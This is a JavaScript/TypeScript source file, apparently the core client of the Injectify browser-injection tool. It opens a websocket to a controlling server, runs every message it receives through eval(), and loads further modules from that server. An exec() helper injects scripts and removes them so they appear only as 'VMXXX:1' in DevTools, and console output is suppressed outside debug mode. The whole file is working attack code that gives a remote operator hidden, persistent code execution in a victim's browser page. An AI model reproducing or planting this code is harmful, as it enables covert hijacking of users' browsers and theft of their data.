declare var ws: any
/**
 * Injectify core API
 * @class
 */

let injectify = window['injectify'] = class Injectify {
	/**
	 * Listen for a topic from websocket connection
	 * @param {string} topic Topic name to listen to
	 * @param {function} callback Callback to be triggered once topic received
	 */
	static listen(topic, callback) {
		ws.onmessage = message => {
			try {
				let data = JSON.parse(message.data)
				if (topic == data.t || topic == '*') {
					callback(data.d, data.t)
				}
			} catch(e) {
				//throw e
				this.send('e', e.stack)
			}
		}
	}
	/**
	 * Send data to websocket
	 * @param {string} topic Message topic
	 * @param {Object} data Message data
	 */
	static send(topic, data?: any) {
		// If the websocket is dead, return
		if (ws.readyState == 0) return
		try {
			ws.send(JSON.stringify({
				t: topic,
				d: data,
			}))
		} catch(e) {
			this.send('e', e.stack)
		}
	}
	/**
	 * Log data to websocket connection (and locally)
	 * @param {(Object|string)} message Data to be logged
	 * @param {boolean} local Whether to log it in the local console
	 */
	static log(message, local?: boolean) {
		this.send('r', message)
		if (local) console.log(message)
	}
	/**
	 * Get the websocket ping time (in milliseconds)
	 * @param {function} callback Callback to be executed on ping complete
	 */
	static ping(callback?: any) {
		this.send('ping', + new Date())
		if (callback) this.listen('pong', callback)
	}
	/**
	 * Safely execute a script with hidden context. Appears as 'VMXXX:1' in DevTools
	 * @param {string} func the contents inside the <script> tag
	 * @param {element} targetParent element to execute the script under, defaults to document.head
	 */
	static exec(func, targetParent?: any) {
		if (!targetParent) targetParent = document.head
		var script = document.createElement('script')
		script.innerHTML = func
		targetParent.appendChild(script)
		targetParent.removeChild(script)
	}
	/**
	 * Loads a module from the injectify server
	 * @param {string} name module name
	 * @param {(string|Object)} params parameters to be sent to the module
	 * @param {function} callback optional callback once the module has been loaded
	 */
	static module(name, params, callback?: any) {
		window["callbackFor" + name] = callback
		this.send('module', {
			name: name,
			params: params
		})
	}
	/**
	 * Check that the Injectify core is active
	 */
	static get test() {
		return true
	}
	/**
	 * Returns information about Injectify
	 */
	static get info() {
		var project = ws.url.split('?')[1],
			debug   = false
		if (project.charAt(0) == "$") {
			project = project.substring(1)
			debug   = true
		}
		return {
			project  : atob(project),
			debug    : debug,
			websocket: ws.url,
		}
	}
	/**
	 * Returns whether injectify is in debug mode or not
	 * true  - being used in development
	 * false - console output should be suppressed
	 */
	static get debug() {
		return this.info.debug
	}
}

if (injectify.debug) console.warn('⚡️ Injectify core.js loaded! --> https://github.com/samdenty99/injectify', injectify.info)

/**
 * Replace the basic websocket handler with a feature-rich one
 */
injectify.listen('*', (data, topic) => {
	try {
		if (topic == 'error') {
			console.error(data)
			return
		}
		if (/^module:/.test(topic)) {
			var module = topic.substring(7),
				callback = window["callbackFor" + module]
			eval(data)
			if (data !== false && typeof callback == 'function') {
				callback()
			}
			delete window["callbackFor" + module]
			return
		}
		eval(data)
	} catch(e) {
		//if (JSON.stringify(e) == "{}") e = e.stack
		injectify.send('e', e.stack)
	}
})

/**
 * Ping the server every 5 seconds to sustain the connection
 */
clearInterval(window['ping'])
window['ping'] = setInterval(() => {
	injectify.ping()
}, 5000)